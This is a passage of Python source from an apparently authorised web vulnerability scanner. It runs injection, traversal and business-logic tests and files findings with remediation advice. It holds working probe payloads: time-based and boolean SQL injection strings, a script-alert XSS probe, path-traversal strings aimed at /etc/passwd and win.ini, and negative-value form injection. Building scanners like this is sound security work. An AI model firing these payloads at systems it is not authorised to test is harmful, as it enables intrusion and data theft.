                    _bsqli_ev = ""
                    try:
                        _bsqli_rq, _bsqli_rp = _save_http_evidence(
                            out, phase, f"sqli_bool_{param}", r_true)
                        _bsqli_ev = json.dumps(
                            [{"url": purl, "req": str(_bsqli_rq), "resp": str(_bsqli_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Blind SQL Injection (Boolean-Based)",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                        output=(f"Parameter: {param}\n"
                                f"TRUE payload: {_bool_sqli_true} → {r_true.status_code} ({len(r_true.text)} bytes)\n"
                                f"FALSE payload: {_bool_sqli_false} → {r_false.status_code} ({len(r_false.text)} bytes)"),
                        sources="fracture-injection", service=target["scheme"],
                        output_file=_bsqli_ev,
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    )
                    vc.log(f"[injection] Boolean blind SQLi: {purl} param={param}", "SUCCESS")
                    break
            except Exception:
                pass

    # 21. Blind SQL injection — time-based (baseline-gated)
    # The probe must take >= delay seconds LONGER than a baseline request
    # to the same URL+param with a benign value.  A bare `elapsed >= delay`
    # check false-positives on naturally slow pages, load-balanced targets,
    # and session-expired redirects.
    vc.status(phase, "Injection Testing", "running", "Blind SQLi (time-based)", 22, 28)
    _TIME_SQLI = [
        ("' AND SLEEP(3)--",     3.0),
        ("'; WAITFOR DELAY '0:0:3'--", 3.0),
        ("' AND pg_sleep(3)--",  3.0),
        ("1; SELECT SLEEP(3)--", 3.0),
    ]
    import time as _ti
    for entry in params[:5]:
        purl = entry["url"]
        # Skip handler URLs whose params are never database-bound
        if _INJECTION_SKIP_URL_RE.search(purl):
            continue
        for param in entry["params"]:
            # Skip params that are never database-bound (Telerik, handlers)
            if param.lower() in _INJECTION_SKIP_PARAMS or param.startswith("_TSM_"):
                continue
            # Measure baseline response time with a benign value
            try:
                _bl_t0 = _ti.monotonic()
                _bl_r  = _qs_inject(purl, param, "1", sess, timeout)
                _bl_elapsed = _ti.monotonic() - _bl_t0
            except Exception:
                _bl_elapsed = 0.0
            for tsql, delay in _TIME_SQLI:
                try:
                    t0 = _ti.monotonic()
                    r  = _qs_inject(purl, param, tsql, sess, delay + 5)
                    elapsed = _ti.monotonic() - t0
                    _delta = elapsed - _bl_elapsed
                    if r and _inj_is_login_page(r):
                        continue
                    # Require delta to be at least 2x baseline to avoid FPs on
                    # naturally slow endpoints or load-balanced jitter.
                    if r and elapsed >= delay and _delta >= max(delay - 0.5, _bl_elapsed * 2):
                        _tsqli_ev = ""
                        try:
                            _tsqli_rq, _tsqli_rp = _save_http_evidence(
                                out, phase, f"sqli_time_{param}", r)
                            _tsqli_ev = json.dumps(
                                [{"url": purl, "req": str(_tsqli_rq), "resp": str(_tsqli_rp)}])
                        except Exception:
                            pass
                        out.add_finding(
                            title="Blind SQL Injection (Time-Based)",
                            url=purl, port=target["port"], risk="CRITICAL",
                            description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                            output=(f"Parameter: {param}\nPayload: {tsql}\n"
                                    f"Response time: {elapsed:.2f}s (baseline: {_bl_elapsed:.2f}s, "
                                    f"delta: {_delta:.2f}s, threshold: {delay}s)"),
                            sources="fracture-injection", service=target["scheme"],
                            output_file=_tsqli_ev,
                            affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                            remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                        )
                        vc.log(f"[injection] Time-based blind SQLi: {purl} param={param} ({elapsed:.1f}s, baseline {_bl_elapsed:.1f}s)", "SUCCESS")
                        break
                except Exception:
                    pass

    # 22. POST-parameter reflected XSS — test form POST fields
    # (Tests 4/dalfox cover GET query-parameter XSS; this covers POST bodies.)
    vc.status(phase, "Injection Testing", "running", "POST XSS", 23, 28)
    _post_xss_seen: set = set()
    for form in forms[:20]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        if method != "POST":
            continue
        inputs = form.get("inputs", [])
        text_inputs = [i for i in inputs if i.get("name")
                       and i.get("type", "text") in
                       ("text", "textarea", "search", "email", "tel", "url", "")]
        if not text_inputs:
            continue
        for inp in text_inputs:
            pname = inp["name"]
            _fkey = (action, pname)
            if _fkey in _post_xss_seen:
                continue
            for payload in _XSS_PAYLOADS[:3]:
                data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
                data[pname] = payload
                try:
                    r = sess.post(action, data=data, timeout=timeout,
                                  allow_redirects=True)
                    if r and _xss_confirmed(payload, r):
                        _post_xss_seen.add(_fkey)
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"post_xss_{pname}", r,
                            endpoint_url=action, method="POST")
                        _pxss_ss = _capture_xss_screenshot(
                            action, out, phase, f"post_xss_ss_{pname}",
                            target, cfg, auth_session=sess)
                        out.add_finding(
                            title="Reflected Cross-Site Scripting (XSS) — POST Parameter",
                            url=action, port=target["port"], risk="HIGH",
                            description=(
                                f"The form field '{pname}' at {action} reflects user-supplied "
                                f"HTML/script content in the response without encoding.  An "
                                f"attacker can exploit this via an auto-submitting form on a "
                                f"malicious page to execute arbitrary JavaScript in the "
                                f"victim's browser session."),
                            output=(f"Form action: {action}\nField: {pname}\n"
                                    f"Payload: {payload}\nHTTP {r.status_code}"),
                            output_file=f"{_rq},{_rp}" + (f",{_pxss_ss}" if _pxss_ss else ""),
                            sources="fracture-injection", service=target["scheme"],
                            affected=action,
                            owasp="A03:2025 Injection", nist="SI-10",
                            remediation=(
                                "Encode all output contextually (HTML, JS, URL, CSS), "
                                "sanitise input server-side, and enforce a strict "
                                "Content-Security-Policy."),
                            http_code=r.status_code,
                        )
                        vc.log(f"[injection] POST XSS: {action} field={pname}",
                               "SUCCESS")
                        break
                except Exception:
                    pass

    # 23. Error-page reflection XSS — ASP.NET HttpRequestValidationException
    #     and similar framework validation-error patterns.
    #
    #     Many frameworks (ASP.NET, Java, PHP) have built-in request validation
    #     that rejects HTML in form fields.  The vulnerability arises when the
    #     error page echoes the rejected input WITHOUT encoding it:
    #
    #       Input:  <tag attr=val>
    #       Error:  "A potentially dangerous Request.Form value was detected
    #               from the client (field="<tag attr=val>")"
    #                                         ^^^^^^^^^^^^ rendered as HTML
    #
    #     We inject a benign HTML probe (not <script> — we want to avoid
    #     being blocked by WAFs).  If the probe tag appears in the response
    #     as literal HTML (not entity-encoded), the error page is vulnerable.
    #     Then we confirm with a <script> payload on the same field to
    #     establish full XSS.
    vc.status(phase, "Injection Testing", "running",
              "Error-page reflection XSS", 24, 28)
    _ERR_REFL_HTML_PROBE = "fracture<xss a=b>probe"
    _ERR_REFL_SCRIPT     = '<script>alert("fracture_errxss")</script>'
    _ERR_REFL_MARKER_TAG = "<xss a=b>"
    _ERR_REFL_MARKER_SCR = '<script>alert("fracture_errxss")</script>'
    _err_refl_seen: set = set()
    _err_refl_confirmed: set = set()   # actions already confirmed vulnerable
    _err_refl_results: list = []       # collected (action, field, script_ok, ev_r, rq, rp, err_ctx, inj_rq, inj_rp)
    # Test all form fields — including hidden and *_ClientState fields,
    # which are exactly the pattern from the ASP.NET/Telerik finding.
    # Once error-page reflection is confirmed for ONE field on a given
    # form action, skip the remaining fields on that action — they all
    # trigger the same error page.  Results are collected and emitted as
    # a single merged finding at the end.
    for form in forms[:30]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        if not inputs:
            continue
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname:
                continue
            _ekey = (action, pname)
            if _ekey in _err_refl_seen:
                continue
            # Once the error page is confirmed for ANY field on this
            # action, every other field triggers the same page — skip.
            if action in _err_refl_confirmed:
                continue
            data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
            data[pname] = _ERR_REFL_HTML_PROBE
            try:
                if method == "POST":
                    r = sess.post(action, data=data, timeout=timeout,
                                  allow_redirects=True)
                else:
                    r = sess.get(action, params=data, timeout=timeout,
                                 allow_redirects=True)
                if not r:
                    continue
                # Check if the benign <xss a=b> tag was reflected unencoded.
                # The entity-encoded form (&lt;xss a=b&gt;) is safe — only
                # the literal tag in HTML indicates the vulnerability.
                import html as _html_ep
                _enc_tag = _html_ep.escape(_ERR_REFL_MARKER_TAG, quote=True)
                _body = r.text
                if _ERR_REFL_MARKER_TAG not in _body:
                    continue
                # Ensure it's NOT entity-encoded everywhere.
                if _enc_tag in _body:
                    _stripped = _body.replace(_enc_tag, "")
                    if _ERR_REFL_MARKER_TAG not in _stripped:
                        continue  # All occurrences are encoded — safe

                # HTML injection confirmed in error page.  Now confirm
                # script execution by injecting a <script> tag.
                _err_refl_seen.add(_ekey)
                _script_confirmed = False
                data2 = dict(data)
                data2[pname] = _ERR_REFL_SCRIPT
                try:
                    if method == "POST":
                        r2 = sess.post(action, data=data2, timeout=timeout,
                                       allow_redirects=True)
                    else:
                        r2 = sess.get(action, params=data2, timeout=timeout,
                                      allow_redirects=True)
                    if r2 and _ERR_REFL_MARKER_SCR in r2.text:
                        _enc_scr = _html_ep.escape(
                            _ERR_REFL_MARKER_SCR, quote=True)
                        if _enc_scr in r2.text:
                            _str2 = r2.text.replace(_enc_scr, "")
                            _script_confirmed = _ERR_REFL_MARKER_SCR in _str2
                        else:
                            _script_confirmed = True
                except Exception:
                    pass

                _ev_r = r2 if _script_confirmed and r2 else r
                _rq, _rp = _save_http_evidence(
                    out, phase, f"err_refl_xss_{pname}", _ev_r,
                    endpoint_url=action, method=method)

                # ── Capture the original injection request ──────────
                # When the server redirects (e.g. ASP.NET POST →
                # ErrorPage.aspx), _ev_r.request is the redirected
                # GET, not the POST that carried the XSS payload.
                # The original injection lives in history[0].
                _inj_rq = ""
                _inj_rp = ""
                if getattr(_ev_r, "history", None):
                    try:
                        _inj_rq, _inj_rp = _save_http_evidence(
                            out, phase,
                            f"err_refl_xss_{pname}_injection",
                            _ev_r.history[0],
                            endpoint_url=action, method=method)
                    except Exception:
                        pass

                # Detect the specific framework error pattern for context.
                _err_ctx = ""
                if "HttpRequestValidationException" in _ev_r.text:
                    _err_ctx = (
                        "ASP.NET's HttpRequestValidationException error page "
                        "reflects the rejected input without HTML-encoding.  ")
                elif re.search(r'javax\.servlet|java\.lang\.|org\.apache\.',
                               _ev_r.text):
                    _err_ctx = (
                        "A Java/Servlet framework error page reflects the "
                        "rejected input without HTML-encoding.  ")

                _err_refl_confirmed.add(action)
                _err_refl_results.append((action, pname, _script_confirmed,
                                          _ev_r, _rq, _rp, _err_ctx,
                                          _inj_rq, _inj_rp))
                vc.log(f"[injection] Error-page reflection XSS: "
                       f"{action} field={pname} "
                       f"(script={'confirmed' if _script_confirmed else 'html-only'})",
                       "SUCCESS")
            except Exception:
                pass

    # Emit ONE merged finding for all error-page reflection XSS instances.
    if _err_refl_results:
        _any_script = any(sc for _, _, sc, _, _, _, _, _, _ in _err_refl_results)
        _merged_risk = "HIGH" if _any_script else "MEDIUM"
        _merged_title = ("Reflected XSS via Error Page — Script Injection Confirmed"
                         if _any_script
                         else "HTML Injection via Error Page (XSS Likely)")
        # Use the first result's evidence as primary; list all as output_file
        _all_ev = []
        _out_lines = []
        for _ma, _mf, _msc, _mev, _mrq, _mrp, _mctx, _mirq, _mirp in _err_refl_results:
            _redirected = bool(getattr(_mev, "history", None))
            _out_lines.append(
                f"  • {_ma}  field={_mf}  "
                f"script={'CONFIRMED' if _msc else 'html-only'}  "
                f"HTTP={_mev.status_code}"
                + (f"  (redirected from {_mev.history[0].request.url})"
                   if _redirected else ""))
            if _mirq:
                _all_ev.extend([_mirq, _mirp])
            _all_ev.extend([_mrq, _mrp])
        _affected = "\n".join(dict.fromkeys(
            r[0] for r in _err_refl_results))
        # First result's context for description
        _first_ctx = _err_refl_results[0][6] or ""
        _first_ev = _err_refl_results[0][3]
        _err_xss_ss = _capture_xss_screenshot(
            _err_refl_results[0][0], out, phase, "error_page_xss",
            target, cfg, auth_session=sess)
        if _err_xss_ss:
            _all_ev.append(_err_xss_ss)
        out.add_finding(
            title=_merged_title,
            url=_err_refl_results[0][0], port=target["port"],
            risk=_merged_risk,
            description=(
                f"{_first_ctx}Framework validation error pages reflect "
                f"submitted values as raw HTML without entity-encoding.  "
                + ("The reflected <script> tag executes in the browser, "
                   "confirming full cross-site scripting.  "
                   if _any_script else
                   "HTML tag injection is confirmed; script execution "
                   "is likely given the lack of output encoding.  ")
                + "An attacker can exploit this via an auto-submitting "
                f"form (POST) or crafted link (GET).  "
                f"{len(_err_refl_results)} instance(s) across "
                f"{len(_err_refl_confirmed)} form action(s)."),
            output=(
                f"Affected endpoints ({len(_err_refl_results)}):\n"
                + "\n".join(_out_lines)
                + f"\n\nProbe: {_ERR_REFL_HTML_PROBE}\n"
                + (f"Injection URL: {_first_ev.history[0].request.url}\n"
                   f"Injection method: {_first_ev.history[0].request.method}\n"
                   f"Injection field: {_err_refl_results[0][1]}\n"
                   f"Redirect → Error page: {_first_ev.url}\n\n"
                   if getattr(_first_ev, "history", None) else "")
                + f"Response excerpt (first instance):\n{_first_ev.text[:800]}"),
            output_file=",".join(_all_ev),
            sources="fracture-injection", service=target["scheme"],
            affected=_affected,
            owasp="A03:2025 Injection", nist="SI-10",
            remediation=(
                "HTML-encode all user-supplied values before "
                "rendering them in error pages.  Replace "
                "< > \" ' & with their HTML entities.  Configure "
                "the framework to display generic error pages in "
                "production (ASP.NET: <customErrors mode=\"On\"/>)."),
            http_code=_first_ev.status_code,
        )

    # ── HTTP Parameter Pollution (#4 FR-458) ──────────────────────────────────
    vc.status(phase, "Injection Testing", "running", "HTTP Parameter Pollution", 25, 28)
    _hpp_canary = "fr4ctur3_hpp_" + str(int(time.time()))[-6:]
    _hpp_found: list = []
    for entry in params[:30]:
        purl = entry["url"]
        for param_name in entry["params"][:5]:
            try:
                _parsed = urllib.parse.urlparse(purl)
                _qs = urllib.parse.parse_qs(_parsed.query, keep_blank_values=True)
                _orig_val = _qs.get(param_name, [""])[0]
                # Duplicate the parameter: ?param=original&param=canary
                _hpp_qs = _parsed.query + f"&{urllib.parse.quote(param_name)}={_hpp_canary}"
                _hpp_url = urllib.parse.urlunparse(
                    _parsed._replace(query=_hpp_qs))
                _hpp_r = sess.get(_hpp_url, timeout=timeout, allow_redirects=True)
                if _hpp_r and _hpp_canary in (_hpp_r.text or ""):
                    _hpp_text = _hpp_r.text or ""
                    for _strip_u in (_hpp_r.url, _hpp_url,
                                     urllib.parse.unquote(_hpp_url),
                                     urllib.parse.unquote_plus(_hpp_url)):
                        _hpp_text = _hpp_text.replace(_strip_u, "")
                    _hpp_text = re.sub(
                        r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                        + re.escape(_hpp_canary) + r'[^"\']*["\']',
                        '', _hpp_text, flags=re.I)
                    if _hpp_canary not in _hpp_text:
                        continue
                    _hpp_ev: list = []
                    try:
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"hpp_{param_name}",
                            _hpp_r, endpoint_url=purl, method="GET")
                        _hpp_ev.extend([str(_rq), str(_rp)])
                    except Exception:
                        pass
                    _hpp_found.append({
                        "url": purl,
                        "param": param_name,
                        "evidence": _hpp_ev,
                        "http_code": _hpp_r.status_code,
                    })
                    vc.log(f"[injection] HPP reflected: {param_name} on {purl}", "SUCCESS")
                    break
            except Exception:
                pass
    # POST form HPP
    for form in forms[:15]:
        _f_action = form.get("action", url)
        _f_method = form.get("method", "POST").upper()
        if _f_method != "POST":
            continue
        _f_inputs = form.get("inputs", [])
        for inp in _f_inputs[:5]:
            _inp_name = inp.get("name", "")
            if not _inp_name or inp.get("type", "").lower() in ("hidden", "submit", "button"):
                continue
            try:
                _post_data = {i["name"]: i.get("value", "") for i in _f_inputs if i.get("name")}
                _post_data[_inp_name] = "safe_value"
                _hpp_body = urllib.parse.urlencode(_post_data)
                _hpp_body += f"&{urllib.parse.quote(_inp_name)}={_hpp_canary}"
                _hpp_r = sess.post(
                    _f_action, data=_hpp_body, timeout=timeout,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    allow_redirects=True)
                if _hpp_r and _hpp_canary in (_hpp_r.text or ""):
                    _hpp_post_text = _hpp_r.text or ""
                    for _strip_u in (_hpp_r.url, _f_action):
                        _hpp_post_text = _hpp_post_text.replace(_strip_u, "")
                    _hpp_post_text = re.sub(
                        r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                        + re.escape(_hpp_canary) + r'[^"\']*["\']',
                        '', _hpp_post_text, flags=re.I)
                    if _hpp_canary not in _hpp_post_text:
                        continue
                    _hpp_ev = []
                    try:
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"hpp_post_{_inp_name}",
                            _hpp_r, endpoint_url=_f_action, method="POST")
                        _hpp_ev.extend([str(_rq), str(_rp)])
                    except Exception:
                        pass
                    _hpp_found.append({
                        "url": _f_action,
                        "param": _inp_name,
                        "evidence": _hpp_ev,
                        "http_code": _hpp_r.status_code,
                    })
                    vc.log(f"[injection] HPP POST reflected: {_inp_name} on {_f_action}", "SUCCESS")
                    break
            except Exception:
                pass
    if _hpp_found:
        _hpp_out = "\n".join(
            f"  {h['url']}  param={h['param']}" for h in _hpp_found
        )
        _hpp_all_ev: list = []
        for h in _hpp_found:
            _hpp_all_ev.extend(h["evidence"])
        out.add_finding(
            title="HTTP Parameter Pollution (Reflected)",
            url=_hpp_found[0]["url"], port=target["port"], risk="MEDIUM",
            description=(
                f"Duplicate HTTP parameters are processed and reflected in "
                f"responses. When a server accepts duplicate parameter names, "
                f"an attacker can inject a second value that overrides or "
                f"appends to the first, potentially bypassing input validation "
                f"or injecting malicious content. {len(_hpp_found)} instance(s)."
            ),
            output=f"HPP reflection confirmed ({len(_hpp_found)}):\n{_hpp_out}",
            output_file=",".join(_hpp_all_ev) if _hpp_all_ev else "",
            sources="fracture-injection", service=target["scheme"],
            affected="\n".join(h["url"] for h in _hpp_found),
            owasp="A03:2025 Injection",
            nist="SI-10",
            remediation=(
                "Validate and reject duplicate parameters. Use framework-level "
                "parameter parsing that selects only the first occurrence. "
                "Encode all reflected user input in responses."
            ),
            http_code=_hpp_found[0]["http_code"],
        )

    # 25. toxicache — web cache poisoning
    vc.status(phase, "Injection Testing", "running", "Cache poisoning (toxicache)", 26, 28)
    toxicache_bin = _find_tool("toxicache")
    if toxicache_bin and url:
        tc_out = out.output_path(phase, "toxicache_" + target["hostname"] + ".txt")
        tc_cmd = [toxicache_bin, "-u", url, "-o", str(tc_out)]
        vc.log("[injection] Running toxicache for web cache poisoning ...", "INFO")
        try:
            proc = _popen(tc_cmd, stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, text=True)
            _register_proc(proc)
            _tc_stdout, _tc_stderr = proc.communicate(timeout=120)
            _deregister_proc(proc)
            if not tc_out.exists():
                tc_out.write_text(_tc_stdout, encoding="utf-8")
            out.log_command("toxicache", tc_cmd, tc_out)
            _tc_combined = _tc_stdout + "\n" + (_tc_stderr or "")
            _tc_vulnerable = bool(re.search(
                r'(?:Vulnerable|VULNERABLE|poisoned|POISONED)',
                _tc_combined, re.I))
            _tc_deception = bool(re.search(
                r'(?:deception|DECEPTION|wrong\s+content|cache\s+deception)',
                _tc_combined, re.I))
            _tc_unkeyed = re.findall(
                r'[Uu]nkeyed\s+[Hh]eader[:\s]+([^\n]+)', _tc_combined)
            if _tc_vulnerable:
                out.add_finding(
                    title="Web Cache Poisoning",
                    url=url, port=target["port"], risk="HIGH",
                    description=(
                        "toxicache confirmed that the web cache can be poisoned. "
                        "An attacker can inject malicious content into cached responses, "
                        "which are then served to other users, enabling XSS, open "
                        "redirects, or denial of service at scale."
                    ),
                    output=_tc_stdout[:2000],
                    output_file=str(tc_out),
                    sources="toxicache", service=target["scheme"],
                    affected=url,
                    owasp="A05:2025 Security Misconfiguration",
                    nist="SC-8",
                    remediation=(
                        "Configure the cache to include all relevant request headers "
                        "in the cache key. Disable caching of responses that vary by "
                        "unkeyed headers. Use Vary headers correctly."
                    ),
                )
                vc.log(f"[injection] toxicache: cache poisoning confirmed at {url}", "SUCCESS")
            if _tc_deception:
                out.add_finding(
                    title="Web Cache Deception",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        "toxicache detected web cache deception — the cache serves "
                        "content from one user's session to another. An attacker can "
                        "trick a victim into loading a URL that caches their "
                        "authenticated content, then retrieve it."
                    ),
                    output=_tc_stdout[:2000],
                    output_file=str(tc_out),
                    sources="toxicache", service=target["scheme"],
                    affected=url,
                    owasp="A05:2025 Security Misconfiguration",
                    nist="SC-8",
                    remediation=(
                        "Set Cache-Control: no-store on all authenticated/dynamic "
                        "responses. Validate that path extensions match actual "
                        "content types. Use Vary: Cookie where appropriate."
                    ),
                )
                vc.log(f"[injection] toxicache: cache deception at {url}", "SUCCESS")
            if _tc_unkeyed and not _tc_vulnerable:
                out.add_finding(
                    title="Unkeyed Header in Cache Response",
                    url=url, port=target["port"], risk="LOW",
                    description=(
                        f"toxicache found {len(_tc_unkeyed)} unkeyed header(s) that "
                        f"influence the response but are not included in the cache key. "
                        f"While not directly exploitable, these could enable cache "
                        f"poisoning if the header value is reflected or influences "
                        f"response content."
                    ),
                    output=f"Unkeyed headers:\n" + "\n".join(
                        f"  • {h.strip()}" for h in _tc_unkeyed),
                    output_file=str(tc_out),
                    sources="toxicache", service=target["scheme"],
                    affected=url,
                    owasp="A05:2025 Security Misconfiguration",
                    nist="SC-8",
                    remediation=(
                        "Include all response-influencing headers in the cache key "
                        "or add them to the Vary header. Review CDN/proxy "
                        "configuration for unintended cache key exclusions."
                    ),
                )
                vc.log(f"[injection] toxicache: {len(_tc_unkeyed)} unkeyed headers at {url}", "INFO")
        except Exception as e:
            out.log_error("toxicache", tc_cmd, str(e))

    vc.status(phase, "Injection Testing", "complete", "Done", 28, 28)
    vc.log("[injection] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 5: Traversal
# ─────────────────────────────────────────────
_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]
_LFI_PARAMS = {"file", "page", "include", "path", "template", "view", "doc",
               "document", "load", "read", "content", "lang", "language", "module"}
_TRAVERSAL_RE = re.compile(r'root:.*:/bin/|daemon:.*:/usr/sbin|Win\.ini|\[boot loader\]', re.I)


def _phase_traversal(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict) -> None:
    phase   = "traversal"
    timeout = cfg.get("timeout", 10)
    params  = crawl_data.get("params", [])
    vc.status(phase, "Path Traversal", "running", "Testing params", 0, len(params))

    for idx, entry in enumerate(params[:30]):
        purl = entry["url"]
        vc.status(phase, "Path Traversal", "running", "Testing", idx, len(params))
        for param in entry["params"]:
            is_lfi = param.lower() in _LFI_PARAMS
            payloads = _TRAVERSAL_PAYLOADS if is_lfi else _TRAVERSAL_PAYLOADS[:4]
            for payload in payloads:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r and _TRAVERSAL_RE.search(r.text):
                    _lfi_ev = ""
                    try:
                        _lfi_rq, _lfi_rp = _save_http_evidence(
                            out, phase, f"traversal_{param}", r)
                        _lfi_ev = json.dumps(
                            [{"url": purl, "req": str(_lfi_rq), "resp": str(_lfi_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Path Traversal / Local File Inclusion",
                        url=purl, port=target["port"], risk="HIGH",
                        description="User-supplied input is used in filesystem path construction without adequate sanitisation, allowing an attacker to read or include arbitrary files outside the intended directory.",
                        output=f"Parameter: {param}\nPayload: {payload}\nExcerpt: {r.text[:500]}",
                        sources="fracture-traversal", service=target["scheme"],
                        output_file=_lfi_ev,
                        affected=f"{purl}?{param}=<traversal>",
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Canonicalise all user-supplied paths, resolve them against a fixed base directory, and reject any path that escapes the base; prefer indirect reference maps over direct path handling.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[traversal] LFI: {purl} param={param}", "SUCCESS")
                    break

    vc.status(phase, "Path Traversal", "complete", "Done", len(params), len(params))
    vc.log("[traversal] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 5b: Business Logic
# ─────────────────────────────────────────────
_BL_NUMERIC_FIELDS = re.compile(
    r'qty|quantity|amount|price|cost|total|count|number|'
    r'discount|coupon|fee|rate|balance|credit|debit|units|items', re.I
)
_BL_WORKFLOW_URL = re.compile(
    r'(?<![a-zA-Z])(?:checkout|confirm|payment|pay|order|purchase|cart|'
    r'complete|transfer|submit|process|finalize|done|success|approve|'
    r'step\d)(?![a-zA-Z])', re.I
)
# Pages that are intentionally public — never flag as workflow-step-skip.
# Password reset, login, registration, contact, and other pre-auth pages.
_BL_WORKFLOW_EXCLUDE = re.compile(
    r'(?:send|forgot|reset|recover|change)[\W_]*passw|'
    r'login|log[\W_]*in|sign[\W_]*in|sign[\W_]*up|register|'
    r'create[\W_]*account|contact|unsubscribe|opt[\W_]*out|'
    r'verify[\W_]*email|activate|public|anonymous',
    re.I,
)
# Input types that can carry numeric business values
_BL_NUMERIC_INPUT_TYPES = frozenset({"text", "number", "tel", ""})
# ASP.NET control name prefixes indicating non-numeric controls (dropdowns,
# checkboxes, radio buttons, list controls, buttons)
_BL_ASPNET_CTRL_RE = re.compile(r'(?:^|\$)(drp|ddl|chk|rdo|rad|btn|lst)', re.I)


def _phase_business_logic(target: dict, cfg: dict, pm: ProgressManager,
                          out: OutputManager, sess: requests.Session,
                          crawl_data: dict) -> None:
    phase   = "business_logic"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    links   = crawl_data.get("links", [])
    threads = min(cfg.get("threads", _SCAN_SEM.limit), _SCAN_SEM.limit, 20)

    vc.status(phase, "Business Logic", "running", "Negative value injection", 0, 4)

    # 1. Negative / zero value injection into numeric form fields
    for form in forms[:30]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        num_fields = [
            i for i in inputs if i.get("name")
            and i.get("tag", "input") not in ("select",)
            and i.get("type", "text").lower() in _BL_NUMERIC_INPUT_TYPES
            and not _BL_ASPNET_CTRL_RE.search(i.get("name", ""))
            and _BL_NUMERIC_FIELDS.search(i.get("name", "") + i.get("id", ""))
        ]
        if not num_fields:
            continue
        for test_val, label in [("-1", "negative"), ("0", "zero"), ("-9999", "large negative")]:
            data = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}
            for nf in num_fields:
                data[nf["name"]] = test_val
            try:
                r = (sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                     if method == "POST"
                     else sess.get(action, params=data, timeout=timeout, allow_redirects=True))
                if r and r.status_code in (200, 201, 302) and not re.search(
                        r'error|invalid|not.allowed|rejected|negative|zero', r.text, re.I):
                    if _inj_is_login_page(r):
                        continue
                    field_names = ", ".join(nf["name"] for nf in num_fields)
                    _ev_files: list = []
                    try:
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"neg_{test_val}_{field_names[:30]}",
                            r, endpoint_url=action, method=method)
                        _ev_files = [_rq, _rp]
                    except Exception:
                        pass
                    out.add_finding(
                        title="Business Logic — Numeric Field Accepts Negative/Zero Value",
                        url=action, port=target["port"], risk="HIGH",
                        description=(
                            f"Form at {action} accepted a {label} value ({test_val}) for "
                            f"numeric field(s): {field_names}. This may allow manipulation "
                            f"of quantities, prices, or financial values."
                        ),
                        output=f"Field(s): {field_names}\nTest value: {test_val}\nHTTP {r.status_code}",
                        output_file=",".join(_ev_files) if _ev_files else "",
                        sources="fracture-business-logic", service=target["scheme"],
                        affected=action,
                        owasp="A04:2025 Insecure Design", nist="AC-3",
                        remediation=(
                            "Validate all numeric inputs server-side. Reject zero, "
                            "negative, and implausibly large values. Apply range checks."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[business_logic] Negative value accepted: {action} field={nf['name']}", "SUCCESS")
                    break
            except Exception:
                pass

    # 2. Workflow step skipping — access late-stage pages without prior steps
    vc.status(phase, "Business Logic", "running", "Workflow skip detection", 1, 4)
    workflow_links = [lnk for lnk in links
                      if _BL_WORKFLOW_URL.search(lnk)
                      and not _BL_WORKFLOW_EXCLUDE.search(lnk)]
    for lnk in workflow_links[:20]:
        try:
            bare = requests.Session()
            bare.headers.update(sess.headers)
            bare.verify = False
            r = bare.get(lnk, timeout=timeout, allow_redirects=True)
            if r and r.status_code in (200, 201):
                # Skip if the response is actually a login page (JS redirect,
                # inline form, or meta-refresh — common in ASP.NET WebForms)
                if _inj_is_login_page(r):
                    continue
                # Skip API endpoints that return JSON — a 200 with an empty
                # dataset or error object is not a workflow bypass.  SPAs
                # commonly return 200 with {"error":"unauthorized"} or [].
                _ct = (r.headers.get("Content-Type") or "").lower()
                if "application/json" in _ct or "text/json" in _ct:
                    continue
                # Skip if the response body is trivially small (< 500 bytes)
                # — likely an empty/error response, not a real page.
                if len(r.content) < 500:
                    continue
                _ev_files: list = []
                try:
                    _rq, _rp = _save_http_evidence(
                        out, phase,
                        f"workflow_skip_{hash(lnk) & 0xFFFF:04x}",
                        r, endpoint_url=lnk, method="GET")
                    _ev_files = [_rq, _rp]
                except Exception:
                    pass
                out.add_finding(
